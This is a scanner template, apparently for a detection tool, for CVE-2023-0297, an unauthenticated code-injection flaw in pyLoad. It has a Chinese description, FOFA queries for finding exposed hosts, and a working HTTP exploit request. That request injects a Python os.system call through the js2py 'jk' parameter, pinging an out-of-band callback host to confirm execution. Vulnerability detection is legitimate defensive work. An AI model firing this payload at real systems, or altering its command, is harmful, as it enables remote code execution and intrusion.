id: CVE-2023-0297

info:
  name: pyLoad未授权远程代码执行漏洞CVE-2023-0297/CNNVD-202301-1121
  author: daffainfo
  severity: critical
  verified: true
  description: 
     pyLoad 存在代码注入漏洞，未经身份验证的攻击者可以通过滥用 js2py 功能执行任意Python代码。
     影响版本
     pyLoad <= 0.4.20
     另外，小于0.5.0b3.dev31版本的pyLoad开发版本也受此漏洞影响。
  reference:
    - https://mp.weixin.qq.com/s/nwR3b678vrp_7ptGZv-mbg
    - https://mp.weixin.qq.com/s/MwN8XFPPeO__gpsQXHbiMA
    - https://github.com/bAuh0lz/CVE-2023-0297_Pre-auth_RCE_in_pyLoad
    - https://huntr.dev/bounties/3fd606f7-83e1-4265-b083-2e1889a05e65/
  metadata:
    fofa-query: icon_hash="77699822" || icon_hash="-272805727" || icon_hash="2055939329"
    fofa-query1: Login - pyLoad

set:
  reverse: newReverse()
  reverseURL: reverse.url.host
rules:
  r0:
    request:
      method: POST
      path: /flash/addcrypted2
      body: |
          jk=pyimport%20os;os.system("ping%20{{reverseURL}}");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa
    expression: reverse.wait(5)
expression: r0()